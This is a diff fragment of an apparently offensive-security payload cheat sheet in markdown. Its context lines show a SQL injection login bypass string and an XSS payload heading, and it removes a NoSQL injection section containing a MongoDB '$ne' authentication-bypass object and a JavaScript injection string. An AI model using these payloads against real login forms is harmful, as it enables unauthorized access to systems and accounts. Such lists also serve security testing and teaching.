@@ -15,14 +15,6 @@ admin' OR '1'='1
 ```
 
 
-###  NoSQL Injection
-```json
-{ "username": { "$ne": null }, "password": { "$ne": null } }
-' || 1==1 //
-```
-
----
-
 ##  Cross-Site Scripting (XSS)
 
 ###  Basic Payloads
